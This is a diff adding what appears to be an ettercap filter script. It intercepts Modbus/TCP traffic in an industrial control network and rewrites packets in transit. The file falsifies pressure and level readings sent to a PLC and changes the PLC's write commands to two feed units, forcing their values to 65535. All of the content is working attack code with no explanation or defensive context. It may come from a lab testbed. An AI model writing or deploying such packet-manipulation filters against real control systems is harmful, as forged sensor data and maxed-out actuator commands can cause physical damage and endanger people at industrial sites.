@@ -1,0 +1,31 @@
+# intercept from pressure and manipulate to 65535
+# intercept from level and manipulate to 0
+# intercept from plc to feed 1 and 2 and manipulate to 65535
+
+# pressure/level to plc
+if (ip.src == '192.168.95.14' && ip.dst == '192.168.95.2') {
+    if (tcp.src == 502 && DATA.data + 7 == 0x04) {
+        DATA.data + 9 = 0xff;
+        DATA.data + 10 = 0xff;
+        DATA.data + 11 = 0x00;
+        DATA.data + 12 = 0x00;
+    }
+}
+
+
+# plc to feed 1
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.10') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
+
+# plc to feed 2
+if (ip.src == '192.168.95.2' && ip.dst == '192.168.95.11') {
+    if (tcp.dst == 502 && DATA.data + 7 == 0x10) {
+        DATA.data + 13 = 0xff;
+        DATA.data + 14 = 0xff;
+    }
+}
+
